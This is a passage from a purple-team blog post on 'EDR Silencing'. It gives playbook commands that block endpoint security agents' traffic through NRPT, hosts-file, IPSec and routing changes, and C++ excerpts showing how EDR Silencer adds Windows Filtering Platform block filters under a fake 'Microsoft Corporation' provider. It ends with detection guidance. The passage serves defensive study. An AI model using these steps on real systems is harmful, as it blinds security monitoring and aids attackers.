string">"Add-DnsClientNrptRule -Namespace "</code><code class="yaml plain">.endpoint.security.microsoft.com</code><code class="yaml string">" -NameServers 127.0.0.1 -Comment "</code><code class="yaml plain">Silenced by Name Resolution Policy Table</code><code class="yaml string">""</code></div><div class="line number26 index25 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Add-DnsClientNrptRule -Namespace "</code><code class="yaml plain">endpoint.security.microsoft.com</code><code class="yaml string">" -NameServers 127.0.0.1 -Comment "</code><code class="yaml plain">Silenced by Name Resolution Policy Table</code><code class="yaml string">""</code></div><div class="line number27 index26 alt2"><code class="yaml constants">]</code></div><div class="line number28 index27 alt1"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number29 index28 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number30 index29 alt1"><code class="yaml constants">]</code></div><div class="line number31 index30 alt2">&nbsp;</div><div class="line number32 index31 alt1"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number33 index32 alt2"><code class="yaml plain">id = </code><code class="yaml string">"1.2.0"</code></div><div class="line number34 index33 alt1"><code class="yaml plain">name = </code><code class="yaml string">"1.2.0 - Hosts File"</code></div><div class="line number35 index34 alt2"><code class="yaml plain">description = </code><code class="yaml string">"EDR agent communucation disruption via Host file modification"</code></div><div class="line number36 index35 alt1"><code class="yaml plain">tooling.name = </code><code class="yaml string">"N/A"</code></div><div class="line number37 index36 alt2"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number38 index37 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"N/A"</code></div><div class="line number39 index38 alt2"><code class="yaml constants">]</code></div><div class="line number40 index39 alt1"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number41 index40 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Add-Content -Path "</code><code class="yaml plain">C</code><code class="yaml constants">:</code><code class="yaml plain">\Windows\System32\drivers\etc\hosts</code><code class="yaml string">" -Value "</code><code class="yaml plain">127.0.0.1 edr.domain.com</code><code class="yaml string">""</code></div><div class="line number42 index41 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Add-Content -Path "</code><code class="yaml plain">C</code><code class="yaml constants">:</code><code class="yaml plain">\Windows\System32\drivers\etc\hosts.ics</code><code class="yaml string">" -Value "</code><code class="yaml plain">127.0.0.1 edr.domain.com</code><code class="yaml string">""</code></div><div class="line number43 index42 alt2"><code class="yaml constants">]</code></div><div class="line number44 index43 alt1"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number45 index44 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number46 index45 alt1"><code class="yaml constants">]</code></div><div class="line number47 index46 alt2">&nbsp;</div><div class="line number48 index47 alt1"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number49 index48 alt2"><code class="yaml plain">id = </code><code class="yaml string">"1.3.0"</code></div><div class="line number50 index49 alt1"><code class="yaml plain">name = </code><code class="yaml string">"1.3.0 - IPSec Filter Rules"</code></div><div class="line number51 index50 alt2"><code class="yaml plain">description = </code><code class="yaml string">"EDR agent communucation disruption via IPSec Filter Rules"</code></div><div class="line number52 index51 alt1"><code class="yaml plain">tooling.name = </code><code class="yaml string">"netsh"</code></div><div class="line number53 index52 alt2"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number54 index53 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"N/A"</code></div><div class="line number55 index54 alt2"><code class="yaml constants">]</code></div><div class="line number56 index55 alt1"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number57 index56 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add policy name=ipurplePolicy description=ipurplePolicy"</code></div><div class="line number58 index57 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static set policy name=ipurplePolicy assign=y"</code></div><div class="line number59 index58 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X protocol=tcp description="</code><code class="yaml plain">FilterList</code><code class="yaml string">""</code></div><div class="line number60 index59 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X dstmask=24 protocol=tcp description="</code><code class="yaml plain">FilterList</code><code class="yaml string">""</code></div><div class="line number61 index60 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X Y.Y.Y.Y dstmask=32 protocol=tcp description="</code><code class="yaml plain">FilterList</code><code class="yaml string">""</code></div><div class="line number62 index61 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=X.X.X.X-Y.Y.Y.Y dstmask=32 protocol=tcp description="</code><code class="yaml plain">FilterList</code><code class="yaml string">""</code></div><div class="line number63 index62 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filter filterlist=BlockFilterList srcaddr=me dstaddr=DOMAIN.COM protocol=tcp description="</code><code class="yaml plain">FilterList</code><code class="yaml string">""</code></div><div class="line number64 index63 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add filteraction name=BlockFilterAction action=block"</code></div><div class="line number65 index64 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"netsh ipsec static add rule name=BlockRule policy=ipurplePolicy filterlist=BlockFilterList filteraction=BlockFilterAction description="</code><code class="yaml plain">IPSec Block Rule</code><code class="yaml string">""</code></div><div class="line number66 index65 alt1"><code class="yaml constants">]</code></div><div class="line number67 index66 alt2"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number68 index67 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number69 index68 alt2"><code class="yaml constants">]</code></div><div class="line number70 index69 alt1">&nbsp;</div><div class="line number71 index70 alt2"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number72 index71 alt1"><code class="yaml plain">id = </code><code class="yaml string">"1.4.0"</code></div><div class="line number73 index72 alt2"><code class="yaml plain">name = </code><code class="yaml string">"1.4.0 - Routing Table"</code></div><div class="line number74 index73 alt1"><code class="yaml plain">description = </code><code class="yaml string">"EDR agent communucation disruption via Routing Table Tampering"</code></div><div class="line number75 index74 alt2"><code class="yaml plain">tooling.name = </code><code class="yaml string">"N/A"</code></div><div class="line number76 index75 alt1"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number77 index76 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"N/A"</code></div><div class="line number78 index77 alt1"><code class="yaml constants">]</code></div><div class="line number79 index78 alt2"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number80 index79 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Get-NetIPInterface"</code></div><div class="line number81 index80 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"New-NetRoute -DestinationPrefix "</code><code class="yaml plain">192.168.100.0/32</code><code class="yaml string">" -InterfaceIndex 1 -PolicyStore ActiveStore"</code></div><div class="line number82 index81 alt1"><code class="yaml constants">]</code></div><div class="line number83 index82 alt2"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number84 index83 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number85 index84 alt2"><code class="yaml constants">]</code></div><div class="line number86 index85 alt1">&nbsp;</div><div class="line number87 index86 alt2"><code class="yaml constants">[</code><code class="yaml constants">[</code><code class="yaml plain">Playbook.EDR Silencing</code><code class="yaml constants">]</code><code class="yaml constants">]</code></div><div class="line number88 index87 alt1"><code class="yaml plain">id = </code><code class="yaml string">"1.5.0"</code></div><div class="line number89 index88 alt2"><code class="yaml plain">name = </code><code class="yaml string">"1.5.0 - Secondary IP Addresses"</code></div><div class="line number90 index89 alt1"><code class="yaml plain">description = </code><code class="yaml string">"Assign secondary IP Addresses to block EDR Communications"</code></div><div class="line number91 index90 alt2"><code class="yaml plain">tooling.name = </code><code class="yaml string">"IPMute"</code></div><div class="line number92 index91 alt1"><code class="yaml plain">tooling.references = </code><code class="yaml constants">[</code></div><div class="line number93 index92 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"<a href="https://github.com/idafchev/IPMute/">https://github.com/idafchev/IPMute/</a>"</code></div><div class="line number94 index93 alt1"><code class="yaml constants">]</code></div><div class="line number95 index94 alt2"><code class="yaml plain">executionSteps = </code><code class="yaml constants">[</code></div><div class="line number96 index95 alt1"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"PS&gt; .\IPMute.ps1"</code></div><div class="line number97 index96 alt2"><code class="yaml constants">]</code></div><div class="line number98 index97 alt1"><code class="yaml plain">executionRequirements = </code><code class="yaml constants">[</code></div><div class="line number99 index98 alt2"><code class="yaml spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="yaml string">"Local Administrator"</code></div><div class="line number100 index99 alt1"><code class="yaml constants">]</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">The image below demonstrates the detection opportunities of the technique EDR Silencing using the Windows Filtering Platform:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="1687" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-technique-abstract/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-technique-abstract.jpg" data-orig-size="3751,2399" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Technique Abstract" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-technique-abstract.jpg?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-technique-abstract.jpg?w=1024" loading="lazy" width="1024" height="654" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-technique-abstract.jpg?w=1024" alt="" class="wp-image-1687"></figure>



<h2 class="wp-block-heading">Detection</h2>



<p class="has-text-align-justify wp-block-paragraph">Although many EDR Silencing procedures can be emulated using PowerShell modules and built-in binaries like <em>netsh</em>, this technique drawn attention due to its abuse of the Windows Filtering Platform. Organizations could decrease the risk of EDR Silencing related threats by enforcing group policies or via deployment of application control solutions on endpoints and servers. However, some organizations face challenges enforcing these controls, so assessing visibility and engineer detections for each procedure is necessary. The vast majority of EDR Silencing procedures rely on commands that perform registry key modifications or file modifications (i.e. hosts file). Therefore, monitoring the associated registry keys and developing rules could detect most of the threats. On the other hand, the procedure that abuses the Windows Filtering Platform require also monitoring at the API level.</p>



<h3 class="wp-block-heading has-text-align-justify">Windows Filtering Platform</h3>



<p class="has-text-align-justify wp-block-paragraph">Modern Endpoint Detection and Response solutions interact with the Windows Filtering Platform to enforce network level visibility, telemetry and containment. The proof of concept EDR Silencer uses a specific workflow to block EDR communication via the Windows Filtering Platform. Initially, the tool uses the <mark style="background-color:#6618b5;color:#ffffff" class="has-inline-color">CreateToolhelp32Snapshot</mark> API to take a snapshot of the running processes and perform a correlation with the hard-coded list of known EDR executables using the functions <strong>Process32First</strong> and <strong>Process32Next</strong>.</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_806991" class="syntaxhighlighter  cpp"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp plain">hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</code></div><div class="line number2 index1 alt1"><code class="cpp spaces">&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(hProcessSnap == INVALID_HANDLE_VALUE) {</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\n"</code><code class="cpp plain">, GetLastError());</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code><code class="cpp plain">;</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="cpp plain">pe32.dwSize = </code><code class="cpp keyword bold">sizeof</code><code class="cpp plain">(PROCESSENTRY32);</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(!Process32First(hProcessSnap, &amp;pe32)) {</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"[-] Process32First failed with error code: 0x%x.\n"</code><code class="cpp plain">, GetLastError());</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">CloseHandle(hProcessSnap);</code></div><div class="line number11 index10 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code><code class="cpp plain">;</code></div><div class="line number12 index11 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">For matched processes, the <strong>OpenProcess</strong> API is used to open a handle and the full image path of the EDR executables is retrieved via the <strong>QueryFullProcessImageNameW</strong>. </p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_961793" class="syntaxhighlighter  cpp"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp color1 bold">HANDLE</code> <code class="cpp plain">hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);</code></div><div class="line number2 index1 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(hProcess) {</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">WCHAR</code> <code class="cpp plain">fullPath[MAX_PATH] = {0};</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">DWORD</code> <code class="cpp plain">size = MAX_PATH;</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWPM_FILTER_CONDITION0 cond = {0};</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWPM_FILTER0 filter = {0};</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWPM_PROVIDER0 provider = {0};</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">GUID providerGuid = {0};</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWP_BYTE_BLOB* appId = NULL;</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">UINT64</code> <code class="cpp plain">filterId = 0;</code></div><div class="line number11 index10 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">ErrorCode errorCode = CUSTOM_SUCCESS;</code></div><div class="line number12 index11 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</div><div class="line number13 index12 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">QueryFullProcessImageNameW(hProcess, 0, fullPath, &amp;size);</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">The EDR Silencer then attempts to convert the retrieved executable path to FWP Application Identifier (FWP_BYTE_BLOB_TYPE). The Windows Filtering Platform uses that identifier to associate traffic with an application. In the case of EDR Silencer, it is used to associate traffic with EDR processes. </p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_304262" class="syntaxhighlighter  cpp"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp plain">cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;</code></div><div class="line number2 index1 alt1"><code class="cpp plain">cond.conditionValue.byteBlob = appId;</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">On the last stage, the tool interacts with the Windows Filtering Platform and opens a session using one of its core API’s such as the <strong>FwpmEngineOpen0</strong>. A custom provider named <em>Microsoft Corporation</em> is added via the <strong>FwpmProviderAdd0</strong> and filters are added via the <strong>FwpmFilterAdd0</strong> API. The action type <em>FWP_ACTION_BLOCK</em> is configured at maximum weight and is applied to block the EDR traffic.</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_47130" class="syntaxhighlighter  cpp"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp comments">// Addition of a Provider</code></div><div class="line number2 index1 alt1"><code class="cpp keyword bold">if</code> <code class="cpp plain">(GetProviderGUIDByDescription(providerDescription, &amp;providerGuid)) {</code></div><div class="line number3 index2 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.providerKey = &amp;providerGuid;</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">} </code><code class="cpp keyword bold">else</code> <code class="cpp plain">{</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">provider.displayData.name = providerName;</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">provider.displayData.description = providerDescription;</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">result = FwpmProviderAdd0(hEngine, &amp;provider, NULL);</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="cpp comments">// Addition of a Filter</code></div><div class="line number11 index10 alt2"><code class="cpp plain">result = FwpmFilterAdd0(hEngine, &amp;filter, NULL, &amp;filterId);</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="cpp comments">// Action Block at Maximum Weight</code></div><div class="line number14 index13 alt1"><code class="cpp plain">filter.displayData.name = filterName;</code></div><div class="line number15 index14 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.flags = FWPM_FILTER_FLAG_PERSISTENT;</code></div><div class="line number16 index15 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;</code></div><div class="line number17 index16 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.action.type = FWP_ACTION_BLOCK;</code></div><div class="line number18 index17 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">UINT64</code> <code class="cpp plain">weightValue = 0xFFFFFFFFFFFFFFFF;</code></div><div class="line number19 index18 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.weight.type = FWP_UINT64;</code></div><div class="line number20 index19 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.weight.uint64 = &amp;weightValue;</code></div><div class="line number21 index20 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;</code></div><div class="line number22 index21 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.matchType = FWP_MATCH_EQUAL;</code></div><div class="line number23 index22 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;</code></div><div class="line number24 index23 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.conditionValue.byteBlob = appId;</code></div><div class="line number25 index24 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.filterCondition = &amp;cond;</code></div><div class="line number26 index25 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.numFilterConditions = 1;</code></div></div></td></tr></tbody></table></div></div></div>


<p class="has-text-align-justify wp-block-paragraph">Detection efforts should focus on Windows and WFP API’s and the associated API’s that are generated as a result of these activities.</p>



<h4 class="wp-block-heading">API’s</h4>



<p class="has-text-align-justify wp-block-paragraph">The procedure that abuses the Windows Filtering Platform to constraint EDR agent ability to communicate back to the cloud, utilises a set of Windows Filtering Platform API calls to perform actions such as open session, enumeration, addition and deletion of filters. Microsoft has visibility (if enabled), and therefore these actions could be detected via the Windows Event logs. The table below summarize the WFP API calls and the associated windows event id’s.</p>



